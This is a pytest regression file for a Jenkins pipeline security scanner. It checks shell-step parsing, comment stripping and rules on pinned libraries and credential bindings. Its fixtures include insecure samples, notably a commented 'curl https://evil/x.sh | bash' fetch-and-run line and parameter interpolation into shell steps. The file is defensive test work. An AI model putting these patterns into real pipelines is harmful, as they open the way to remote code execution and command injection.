"""Regression tests from the rule audit (Jenkins fixes).

A3: the shared ``SHELL_STEP_RE`` only matched a shell body that came
immediately after the step keyword (``sh "..."`` / ``sh('...')``). The
Groovy named-argument forms ``sh(script: "...")`` and
``sh label: 'x', script: "..."`` escaped every rule that scans shell
bodies (JF-002/030/036/037/...). It also lacked a leading word boundary,
so a token merely ending in ``sh`` (``publish``) was read as a shell step.
"""
from __future__ import annotations

from .conftest import run_check


class TestSHELLSTEPNamedArgForm:
    def test_jf036_named_arg_script_fires(self):
        groovy = (
            "pipeline {\n"
            "  agent any\n"
            "  parameters { string(name: 'TAG', defaultValue: '') }\n"
            "  stages { stage('b') { steps { script {\n"
            "    sh(script: \"docker build -t app:${params.TAG} .\", returnStdout: true)\n"
            "  } } } }\n"
            "}\n"
        )
        assert run_check(groovy, "JF-036").passed is False

    def test_jf002_named_arg_leading_form_fires(self):
        groovy = (
            "pipeline {\n"
            "  agent any\n"
            "  stages { stage('b') { steps {\n"
            "    sh script: \"echo $BRANCH_NAME\", returnStdout: true\n"
            "  } } }\n"
            "}\n"
        )
        assert run_check(groovy, "JF-002").passed is False

    def test_publish_step_not_treated_as_shell(self):
        # A token ending in ``sh`` with a quoted GString must not be read
        # as a shell step (leading word-boundary fix).
        groovy = (
            "pipeline {\n"
            "  agent any\n"
            "  parameters { string(name: 'X', defaultValue: '') }\n"
            "  stages { stage('b') { steps {\n"
            "    publish \"deploying ${params.X}\"\n"
            "  } } }\n"
            "}\n"
        )
        assert run_check(groovy, "JF-036").passed is True


class TestComment202607LowFindings:
    """2026-07 audit LOW findings: rules scanned raw text, so a pattern
    in a Groovy comment false-fired (FP) or falsely satisfied a presence
    check (FN). Each now scans the comment-stripped body.
    """

    def _wrap(self, body):
        return (
            "pipeline { agent any\n"
            "  stages { stage('b') { steps {\n"
            f"{body}\n"
            "  } } } }\n"
        )

    def test_jf023_curl_k_in_comment_does_not_fire(self):
        body = ("// policy: never pass curl -k or --insecure to a fetch\n"
                "sh 'curl -fsSL https://x/y -o z'")
        assert run_check(self._wrap(body), "JF-023").passed is True

    def test_jf018_insecure_index_in_comment_does_not_fire(self):
        body = ("// legacy: pip install --index-url http://old-pypi/simple\n"
                "sh 'pip install -r requirements.txt'")
        assert run_check(self._wrap(body), "JF-018").passed is True

    def test_jf016_curl_pipe_in_comment_does_not_fire(self):
        body = "// do NOT do curl https://evil/x.sh | bash\nsh 'make'"
        assert run_check(self._wrap(body), "JF-016").passed is True

    def test_jf021_npm_install_in_comment_does_not_fire(self):
        body = "// old: npm install express (switched to npm ci)\nsh 'npm ci'"
        assert run_check(self._wrap(body), "JF-021").passed is True

    def test_jf022_npm_update_in_comment_does_not_fire(self):
        body = "// avoid npm update in CI\nsh 'npm ci'"
        assert run_check(self._wrap(body), "JF-022").passed is True

    def test_jf015_timeout_only_in_comment_is_missed_not_credited(self):
        # FN: a commented timeout used to satisfy the presence check.
        body = "// TODO: wrap in timeout(time: 30, unit: 'MINUTES')\nsh 'make'"
        assert run_check(self._wrap(body), "JF-015").passed is False
        # a real wrapper still passes
        real = ("timeout(time: 30, unit: 'MINUTES') { sh 'make' }")
        assert run_check(self._wrap(real), "JF-015").passed is True

    def test_jf027_standalone_fingerprint_step_passes(self):
        # FP: the standalone ``fingerprint '<glob>'`` step records the
        # same digests as ``fingerprint: true``.
        body = "archiveArtifacts artifacts: '*.jar'\nfingerprint '**/*.jar'"
        assert run_check(self._wrap(body), "JF-027").passed is True
        # still fails when nothing records a fingerprint
        body = "archiveArtifacts artifacts: '*.jar'"
        assert run_check(self._wrap(body), "JF-027").passed is False


class TestAudit202607LowJenkinsC1:
    """2026-07 audit LOW findings (jenkins_c1 chunk)."""

    def test_jf001_prerelease_tag_is_pinned(self):
        pinned = (
            "@Library('shared@v1.4.2-rc1') _\n"
            "pipeline { agent any\n"
            "  stages { stage('b') { steps { sh 'make' } } } }\n"
        )
        assert run_check(pinned, "JF-001").passed is True
        floating = (
            "@Library('shared@main') _\n"
            "pipeline { agent any\n"
            "  stages { stage('b') { steps { sh 'make' } } } }\n"
        )
        assert run_check(floating, "JF-001").passed is False

    def test_jf009_method_call_image_form_scanned(self):
        cfg = (
            "pipeline { agent { docker { image('maven:3.9') } }\n"
            "  stages { stage('b') { steps { sh 'make' } } } }\n"
        )
        assert run_check(cfg, "JF-009").passed is False

    def test_jf012_method_call_load_form_detected(self):
        cfg = (
            "pipeline { agent any\n"
            "  stages { stage('b') { steps { script {\n"
            "    def h = load('ci/helpers.groovy')\n"
            "  } } } } }\n"
        )
        assert run_check(cfg, "JF-012").passed is False

    def test_jf004_aws_binding_without_aws_named_id(self):
        cfg = (
            "pipeline { agent any\n"
            "  stages { stage('b') { steps {\n"
            "    withCredentials([usernamePassword(credentialsId: 'prod-static', "
            "usernameVariable: 'AWS_ACCESS_KEY_ID', "
            "passwordVariable: 'AWS_SECRET_ACCESS_KEY')]) { sh 'aws s3 ls' }\n"
            "  } } } }\n"
        )
        assert run_check(cfg, "JF-004").passed is False


class TestAudit202607LowJenkinsC3:
    """2026-07 audit LOW findings (jenkins_c3 chunk)."""

    def test_jf032_exploit_example_vulnerable_block_fires(self):
        from pipeline_check.core.checks.jenkins.rules import (
            jf032_agent_label_injection as jf032,
        )
        vuln, safe = jf032.RULE.exploit_example.split("// Safe", 1)
        # The documented Vulnerable block must actually fire...
        assert run_check(vuln, "JF-032").passed is False
        # ...and the Safe block (static literal label) must pass.
        assert run_check("// Safe" + safe, "JF-032").passed is True
